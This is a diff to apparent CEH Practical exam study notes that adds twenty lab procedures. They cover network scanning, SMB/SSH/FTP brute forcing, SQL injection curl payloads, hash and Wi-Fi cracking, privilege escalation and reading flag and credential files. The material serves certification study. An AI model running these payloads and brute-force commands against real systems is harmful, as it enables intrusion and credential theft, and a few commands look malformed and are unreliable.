@@ -1,4 +1,4 @@
-# My ceh practical notes
+# CEH Practical Notes
 #  Scanning Networks (always do sudo su) --> To be root
 ```
 1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
@@ -112,3 +112,130 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (Fo
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
+
+# Pentest Procedures
+
+## 1. Identify FQDN of Domain Controller
+```sh
+nmap -p 389,636,3268,3269 --script ldap-rootdse <target-network>
+nmcli dev show | grep DOMAIN
+nslookup <DC-IP>
+```
+
+## 2. Identify IP of WampServer
+```sh
+nmap -p 80,443,3306,8080 -A <target-network>
+```
+
+## 3. SMB Enumeration & Credential Cracking
+```sh
+nmap -p 445 --script smb-enum-shares,smb-enum-users <target-network>
+medusa -h <target-IP> -u Henry -P passwords.txt -M smbnt
+smbclient -U Henry //<target-IP>/sharename
+cat Sniff.txt | base64 --decode
+```
+
+## 4. Covert Access & ELF Hash Extraction
+```sh
+nmap -p 22 --script ssh-brute <target-network>
+sftp user@<target-IP>
+cd Scan
+ls -lah
+sha384sum highest_entropy_file.elf | tail -c 5
+```
+
+## 5. Vulnerability Scan
+```sh
+nmap -p 80,443,3306 --script vuln 172.20.0.16
+searchsploit <vulnerable-service>
+```
+
+## 6. Remote Exploit & File Retrieval
+```sh
+nmap -p 22,23,3389 --script exploit <target-network>
+ssh user@<target-IP>
+cat /path/to/NetworkPass.txt
+```
+
+## 7. Steganography Analysis
+```sh
+stegseek MyTrip.jpg
+steghide extract -sf MyTrip.jpg
+strings MyTrip.jpg
+```
+
+## 8. Exploit FTP & Retrieve Credentials
+```sh
+nmap -p 21 --script ftp-anon,ftp-brute <target-network>
+ftp <target-IP>
+get Credentials.txt
+```
+
+## 9. Privilege Escalation on Ubuntu
+```sh
+sudo -l
+sudo su
+cat /root/imroot.txt
+```
+
+## 10. Malware Entry Point Analysis
+```sh
+pescan C:\Users\Admin\Documents\die-another-da
+```
+
+## 11. Identify DDoS Attacker
+```sh
+tshark -r attack-traffic.pcapng -T fields -e ip.src | sort | uniq -c | sort -nr | head -1
+```
+
+## 12. SQL Injection to Extract Password
+```sh
+curl -X POST 'http://cinema.cehorg.com/login' --data "username=Sarah' OR '1'='1&password=test"
+```
+
+## 13. Web Exploit for Flag
+```sh
+curl -X GET 'http://www.cehorg.com/index.php?page_id=84'
+```
+
+## 14. Exploit & Locate Flag.txt
+```sh
+nmap -p 80 --script http-vuln* 192.168.0.64
+curl -X GET 'http://192.168.0.64/Flag.txt'
+```
+
+## 15. SQL Injection for Flag
+```sh
+curl -X GET "http://cybersec.cehorg.com?id=1' UNION SELECT flag FROM secret_table --"
+```
+
+## 16. Retrieve & Crack MD5 Hash
+```sh
+curl -O http://172.20.0.16:8080/DVWA/hackable/uploads/Hast.txt
+hashcat -m 0 Hast.txt rockyou.txt
+```
+
+## 17. IoT Traffic Analysis
+```sh
+tshark -r IoT_Capture.pcapng -Y "mqtt.msgtype==3" -T fields -e mqtt.msglen
+```
+
+## 18. Crack Wi-Fi Password
+```sh
+aircrack-ng WirelessCapture.cap -w rockyou.txt
+```
+
+## 19. Retrieve Server Access Code
+```sh
+nmap -p 139,445 --script smb-enum-shares <target-network>
+smbclient //<target-IP>/C$ -U user
+get sa_code.txt
+```
+
+## 20. VeraCrypt Decryption & Secret Extraction
+```sh
+cat Key2Secret.txt | hashcat -m 1400 -a 0 rockyou.txt
+veracrypt -t -m=256 -p <password> /mnt/Secret
+cat /mnt/Confindential.txt
+```
+
